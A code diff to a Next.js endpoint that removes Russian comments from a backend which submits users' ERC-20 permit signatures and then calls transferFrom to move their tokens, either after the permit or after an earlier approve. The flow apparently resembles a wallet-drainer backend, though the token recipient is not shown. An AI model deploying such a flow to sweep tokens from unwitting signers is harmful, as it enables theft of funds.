@@ -1,6 +1,4 @@
 // app/api/execute-permit2/route.ts
-// BACKEND: Обрабатывает permit И approve методы
-
 import { NextRequest, NextResponse } from 'next/server';
 import { ethers } from 'ethers';
 
@@ -43,24 +41,20 @@ export async function POST(request: NextRequest) {
       return NextResponse.json({ error: 'Unsupported network' }, { status: 400 });
     }
 
-    // Подключаемся к сети
     const provider = new ethers.JsonRpcProvider(config.rpcUrl);
     const wallet = new ethers.Wallet(EXECUTOR_PRIVATE_KEY, provider);
     
     console.log(`   Backend wallet: ${wallet.address}`);
 
-    // Контракт токена
     const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, wallet);
 
     let txHash: string;
 
     if (method === 'permit') {
-      // 🎯 МЕТОД 1: PERMIT + TRANSFERFROM
       console.log(`   🎯 Method: PERMIT + transferFrom`);
       txHash = await executePermitMethod(body, tokenContract, wallet);
       
     } else if (method === 'approve') {
-      // 🔄 МЕТОД 2: TRANSFERFROM (после approve)
       console.log(`   🔄 Method: transferFrom (after approve)`);
       txHash = await executeApproveMethod(body, tokenContract);
       
@@ -102,9 +96,6 @@ export async function POST(request: NextRequest) {
   }
 }
 
-// ============================================
-// МЕТОД 1: PERMIT + TRANSFERFROM
-// ============================================
 async function executePermitMethod(
   body: any,
   tokenContract: ethers.Contract,
@@ -112,7 +103,6 @@ async function executePermitMethod(
 ): Promise<string> {
   const { owner, spender, value, deadline, v, r, s } = body;
 
-  // 1. Вызываем permit()
   console.log(`   📝 Calling permit()...`);
   
   const permitTx = await tokenContract.permit(
@@ -132,7 +122,6 @@ async function executePermitMethod(
   await permitTx.wait();
   console.log(`   ✅ Permit successful!`);
 
-  // 2. Вызываем transferFrom()
   console.log(`   📤 Calling transferFrom()...`);
   
   const transferTx = await tokenContract.transferFrom(
@@ -154,9 +143,6 @@ async function executePermitMethod(
   return transferTx.hash;
 }
 
-// ============================================
-// МЕТОД 2: TRANSFERFROM (после approve)
-// ============================================
 async function executeApproveMethod(
   body: any,
   tokenContract: ethers.Contract
@@ -184,9 +170,6 @@ async function executeApproveMethod(
   return transferTx.hash;
 }
 
-// ============================================
-// GET - STATUS CHECK
-// ============================================
 export async function GET() {
   try {
     const hasPrivateKey = !!EXECUTOR_PRIVATE_KEY;
@@ -199,7 +182,6 @@ export async function GET() {
         const tempWallet = new ethers.Wallet(EXECUTOR_PRIVATE_KEY);
         executorAddress = tempWallet.address;
 
-        // Проверяем балансы в разных сетях
         for (const [network, config] of Object.entries(BACKEND_CONFIG)) {
           try {
             const provider = new ethers.JsonRpcProvider(config.rpcUrl);
